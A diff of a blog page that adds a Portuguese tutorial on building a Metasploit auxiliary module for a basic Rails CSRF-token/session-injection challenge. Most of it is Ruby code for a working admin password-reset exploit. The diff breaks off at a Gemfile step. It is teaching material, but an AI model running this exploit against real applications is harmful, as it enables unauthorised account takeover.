@@ -9,7 +9,30 @@
   <meta name="author" content="P0cL4bs">
 
   
-  <meta name="description" content=" Blog Archives Recent Posts GitHub Repos Status updating... @P0cL4bs on GitHub ">
+  <meta name="description" content="1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM MMMMMMMMMM
+MMMN$ vMMMM
+MMMNl MMMMM MMMMM JMMMM &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +89,456 @@
       <div class="blog-index">
   
   
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/03/31/rails-session-injection-challenge-criando-um-modulo-para-o-metasploit/">Rails Session Injection Challenge: Criando Um Módulo Para O Metasploit</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-31T15:49:07-03:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>3:49 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+</span><span class='line'>MMMMMMMMMMM                MMMMMMMMMM
+</span><span class='line'>MMMN$                           vMMMM
+</span><span class='line'>MMMNl  MMMMM             MMMMM  JMMMM
+</span><span class='line'>MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+</span><span class='line'>MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+</span><span class='line'>MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+</span><span class='line'>MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+</span><span class='line'>MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+</span><span class='line'>MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+</span><span class='line'>MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+</span><span class='line'>MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+</span><span class='line'>MMMMR  ?MMNM             MMMMM .dMMMM
+</span><span class='line'>MMMMNm `?MMM             MMMM` dMMMMM
+</span><span class='line'>MMMMMMN  ?MM             MM?  NMMMMMN
+</span><span class='line'>MMMMMMMMNe                 JMMMMMNMMM
+</span><span class='line'>MMMMMMMMMMNm,            eMMMMMNMMNMM
+</span><span class='line'>MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+</span><span class='line'>MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+</span><span class='line'>        http://metasploit.pro</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Recentemente o <a href="https://twitter.com/akitaonrails">@akitaonrails</a> fez um <a href="http://www.akitaonrails.com/2014/08/27/small-bite-brincando-com-metasploit">post</a> sobre um <a href="https://twitter.com/joernchen/status/504304803045208064"> desafio básico de segurança</a> do <a href="https://twitter.com/joernchen">@joernchen</a>.</p>
+
+<p>O desafio é realmente básico, mas aproveitei a oportunidade para mostrar como desenvolver um módulo para o Metasploit.</p>
+
+<p>Vamos criar um módulo auxiliar, para isso crie o arquivo <code>metasploit-framework/modules/auxiliary/admin/http/rails_csrf_token_bypass.rb</code> contendo:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='Ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;mechanize&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
+</span><span class='line'>  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpClient</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">def</span> <span class="nf">initialize</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">def</span> <span class="nf">check</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">def</span> <span class="nf">run</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Importamos primeiramente o core do Metasploit(<code>require 'msf/core'</code>) e a gem <a href="https://rubygems.org/gems/mechanize">mechanize</a>(<code>require 'mechanize'</code>), incluimos também o <code>Msf::Exploit::Remote::HttpClient</code> que nos traz algumas coisas úteis como validação de parâmetros e muito mais, após criamos 3 métodos:</p>
+
+<ul>
+<li>initialize : Adicionamos informações do módulo que será usado pelo Metasploit.</li>
+<li>check : Faremos a validação se o host está vulneravel.</li>
+<li>run : Código que explorará a falha.</li>
+</ul>
+
+
+<h2>initialize</h2>
+
+<p>Nesse método adicionamos informações como nome, descrição, autor e licença no <code>super()</code>, e adicionamos algumas opções para usarmos no exploit com <code>register_options</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='Ruby'><span class='line'><span class="c1">#include......</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">initialize</span>
+</span><span class='line'>  <span class="k">super</span><span class="p">(</span>
+</span><span class='line'>    <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;Rails CSRF Bypass&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="s1">&#39;Version&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;$Revision: 1 $&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;Session Injection Exploit for Rails App&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="s1">&#39;Author&#39;</span>        <span class="o">=&gt;</span>
+</span><span class='line'>    <span class="o">[</span>
+</span><span class='line'>      <span class="s1">&#39;akitaonrails&#39;</span><span class="p">,</span> <span class="c1">#original discovery and disclosure</span>
+</span><span class='line'>      <span class="s1">&#39;joridos&#39;</span> <span class="c1">#metasploit module</span>
+</span><span class='line'>    <span class="o">]</span><span class="p">,</span>
+</span><span class='line'>    <span class="s1">&#39;License&#39;</span>        <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
+</span><span class='line'>  <span class="p">)</span>
+</span><span class='line'>  <span class="n">register_options</span><span class="p">(</span>
+</span><span class='line'>    <span class="o">[</span>
+</span><span class='line'>      <span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TARGETURI&#39;</span><span class="p">,</span> <span class="o">[</span> <span class="kp">true</span><span class="p">,</span>  <span class="s1">&#39;The request URI&#39;</span><span class="p">,</span> <span class="s1">&#39;/reset/_csrf_token&#39;</span><span class="o">]</span><span class="p">),</span>
+</span><span class='line'>      <span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PASSWORD&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;The password to set&#39;</span><span class="o">]</span><span class="p">),</span>
+</span><span class='line'>    <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">#def check.....</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>check</h2>
+
+<p>Aqui nós verificamos se o alvo está online e vulnerável, então exibimos <code>Exploit::CheckCode::Detected[0]</code> e retornamos <code>Exploit::CheckCode::Vulnerable</code>, se não estiver vulnerável retornamos <code>return Exploit::CheckCode::Safe</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='Ruby'><span class='line'><span class="k">def</span> <span class="nf">check</span>
+</span><span class='line'>  <span class="n">agent</span> <span class="o">=</span> <span class="no">Mechanize</span><span class="o">.</span><span class="n">new</span> <span class="p">{</span> <span class="o">|</span><span class="n">agent</span><span class="o">|</span>
+</span><span class='line'>    <span class="n">agent</span><span class="o">.</span><span class="n">user_agent_alias</span> <span class="o">=</span> <span class="s1">&#39;Mac Safari&#39;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">page</span> <span class="o">=</span> <span class="n">agent</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">/&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">print_status</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Detected</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>    <span class="n">print_error</span> <span class="s2">&quot;Host not found&quot;</span>
+</span><span class='line'>    <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Unsupported</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">page</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="s1">&#39;meta[@name=&quot;csrf-token&quot;]&#39;</span><span class="p">)</span><span class="o">[</span><span class="ss">:content</span><span class="o">]</span>
+</span><span class='line'>    <span class="n">print_status</span><span class="p">(</span><span class="s1">&#39;Found csrf-token, exploitable&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Vulnerable</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>    <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Safe</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Tipos de retorno disponível:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='Ruby'><span class='line'><span class="no">CheckCode</span><span class="o">::</span><span class="no">Safe</span> <span class="c1"># não explorável</span>
+</span><span class='line'><span class="no">CheckCode</span><span class="o">::</span><span class="no">Detected</span> <span class="c1"># serviço detectado</span>
+</span><span class='line'><span class="no">CheckCode</span><span class="o">::</span><span class="no">Appears</span> <span class="c1"># versão vulnerável</span>
+</span><span class='line'><span class="no">CheckCode</span><span class="o">::</span><span class="no">Vulnerable</span> <span class="c1"># confirmado a vulnerabilidade</span>
+</span><span class='line'><span class="no">CheckCode</span><span class="o">::</span><span class="no">Unsupported</span> <span class="c1"># não suportado para este módulo.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>run</h2>
+
+<p>Nesse método temos o código do exploit feito pelo <a href="https://twitter.com/akitaonrails">@akitaonrails</a>, modificado um pouco para o módulo.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='Ruby'><span class='line'><span class="k">def</span> <span class="nf">run</span>
+</span><span class='line'>  <span class="vg">$hacked</span> <span class="o">=</span> <span class="kp">false</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">].</span><span class="n">length</span> <span class="o">&lt;</span> <span class="mi">7</span>
+</span><span class='line'>    <span class="n">print_error</span><span class="p">(</span><span class="s2">&quot;use password from 7 characters and no special characters&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Unsupported</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>  <span class="k">begin</span>
+</span><span class='line'>    <span class="n">agent</span> <span class="o">=</span> <span class="no">Mechanize</span><span class="o">.</span><span class="n">new</span> <span class="p">{</span> <span class="o">|</span><span class="n">agent</span><span class="o">|</span>
+</span><span class='line'>      <span class="n">agent</span><span class="o">.</span><span class="n">user_agent_alias</span> <span class="o">=</span> <span class="s1">&#39;Mac Safari&#39;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="n">page</span> <span class="o">=</span> <span class="n">agent</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">/&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">token</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="s1">&#39;meta[@name=&quot;csrf-token&quot;]&#39;</span><span class="p">)</span><span class="o">[</span><span class="ss">:content</span><span class="o">]</span>
+</span><span class='line'>    <span class="n">print_status</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">token</span> <span class="o">=~</span> <span class="sr">/^1\w+/</span>
+</span><span class='line'>      <span class="n">doc</span> <span class="o">=</span> <span class="n">agent</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="si">}#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;TARGETURI&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">?password=</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="vg">$hacked</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">content</span>
+</span><span class='line'>      <span class="n">print_good</span> <span class="n">doc</span><span class="o">.</span><span class="n">content</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>  <span class="k">end</span>  <span class="k">while</span> <span class="vg">$hacked</span> <span class="o">!=</span> <span class="s2">&quot;password changed ;)&quot;</span>
+</span><span class='line'>    <span class="n">print_good</span> <span class="s2">&quot;user: admin&quot;</span>
+</span><span class='line'>    <span class="n">print_good</span> <span class="s2">&quot;pass: </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nosso exploit completo fica:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+</pre></td><td class='code'><pre><code class='Ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;mechanize&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
+</span><span class='line'>  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpClient</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">def</span> <span class="nf">initialize</span>
+</span><span class='line'>    <span class="k">super</span><span class="p">(</span>
+</span><span class='line'>      <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;Rails CSRF Bypass&#39;</span><span class="p">,</span>
+</span><span class='line'>      <span class="s1">&#39;Version&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;$Revision: 1 $&#39;</span><span class="p">,</span>
+</span><span class='line'>      <span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;Session Injection Exploit for Rails App&#39;</span><span class="p">,</span>
+</span><span class='line'>      <span class="s1">&#39;Author&#39;</span>        <span class="o">=&gt;</span>
+</span><span class='line'>      <span class="o">[</span>
+</span><span class='line'>        <span class="s1">&#39;akitaonrails&#39;</span><span class="p">,</span> <span class="c1">#original discovery and disclosure</span>
+</span><span class='line'>        <span class="s1">&#39;joridos&#39;</span> <span class="c1">#metasploit module</span>
+</span><span class='line'>      <span class="o">]</span><span class="p">,</span>
+</span><span class='line'>      <span class="s1">&#39;License&#39;</span>        <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
+</span><span class='line'>    <span class="p">)</span>
+</span><span class='line'>    <span class="n">register_options</span><span class="p">(</span>
+</span><span class='line'>      <span class="o">[</span>
+</span><span class='line'>        <span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TARGETURI&#39;</span><span class="p">,</span> <span class="o">[</span> <span class="kp">true</span><span class="p">,</span>  <span class="s1">&#39;The request URI&#39;</span><span class="p">,</span> <span class="s1">&#39;/reset/_csrf_token&#39;</span><span class="o">]</span><span class="p">),</span>
+</span><span class='line'>        <span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PASSWORD&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;The password to set&#39;</span><span class="o">]</span><span class="p">),</span>
+</span><span class='line'>      <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">def</span> <span class="nf">check</span>
+</span><span class='line'>    <span class="n">agent</span> <span class="o">=</span> <span class="no">Mechanize</span><span class="o">.</span><span class="n">new</span> <span class="p">{</span> <span class="o">|</span><span class="n">agent</span><span class="o">|</span>
+</span><span class='line'>      <span class="n">agent</span><span class="o">.</span><span class="n">user_agent_alias</span> <span class="o">=</span> <span class="s1">&#39;Mac Safari&#39;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">page</span> <span class="o">=</span> <span class="n">agent</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">/&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">print_status</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Detected</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>      <span class="n">print_error</span> <span class="s2">&quot;Host not found&quot;</span>
+</span><span class='line'>      <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Unsupported</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">page</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="s1">&#39;meta[@name=&quot;csrf-token&quot;]&#39;</span><span class="p">)</span><span class="o">[</span><span class="ss">:content</span><span class="o">]</span>
+</span><span class='line'>      <span class="n">print_status</span><span class="p">(</span><span class="s1">&#39;Found csrf-token, exploitable&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Vulnerable</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>      <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Safe</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">def</span> <span class="nf">run</span>
+</span><span class='line'>    <span class="vg">$hacked</span> <span class="o">=</span> <span class="kp">false</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">].</span><span class="n">length</span> <span class="o">&lt;</span> <span class="mi">7</span>
+</span><span class='line'>      <span class="n">print_error</span><span class="p">(</span><span class="s2">&quot;use password from 7 characters and no special characters&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Unsupported</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>    <span class="k">begin</span>
+</span><span class='line'>      <span class="n">agent</span> <span class="o">=</span> <span class="no">Mechanize</span><span class="o">.</span><span class="n">new</span> <span class="p">{</span> <span class="o">|</span><span class="n">agent</span><span class="o">|</span>
+</span><span class='line'>        <span class="n">agent</span><span class="o">.</span><span class="n">user_agent_alias</span> <span class="o">=</span> <span class="s1">&#39;Mac Safari&#39;</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="n">page</span> <span class="o">=</span> <span class="n">agent</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">/&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">token</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="s1">&#39;meta[@name=&quot;csrf-token&quot;]&#39;</span><span class="p">)</span><span class="o">[</span><span class="ss">:content</span><span class="o">]</span>
+</span><span class='line'>      <span class="n">print_status</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>      <span class="k">if</span> <span class="n">token</span> <span class="o">=~</span> <span class="sr">/^1\w+/</span>
+</span><span class='line'>        <span class="n">doc</span> <span class="o">=</span> <span class="n">agent</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;RHOST&#39;</span><span class="o">]</span><span class="si">}#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;TARGETURI&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">?password=</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span class='line'>        <span class="vg">$hacked</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">content</span>
+</span><span class='line'>        <span class="n">print_good</span> <span class="n">doc</span><span class="o">.</span><span class="n">content</span>
+</span><span class='line'>      <span class="k">end</span>
+</span><span class='line'>    <span class="k">end</span>  <span class="k">while</span> <span class="vg">$hacked</span> <span class="o">!=</span> <span class="s2">&quot;password changed ;)&quot;</span>
+</span><span class='line'>      <span class="n">print_good</span> <span class="s2">&quot;user: admin&quot;</span>
+</span><span class='line'>      <span class="n">print_good</span> <span class="s2">&quot;pass: </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PASSWORD&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Adicione o <code>mechanize</code> no Gemfile do metasploit:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
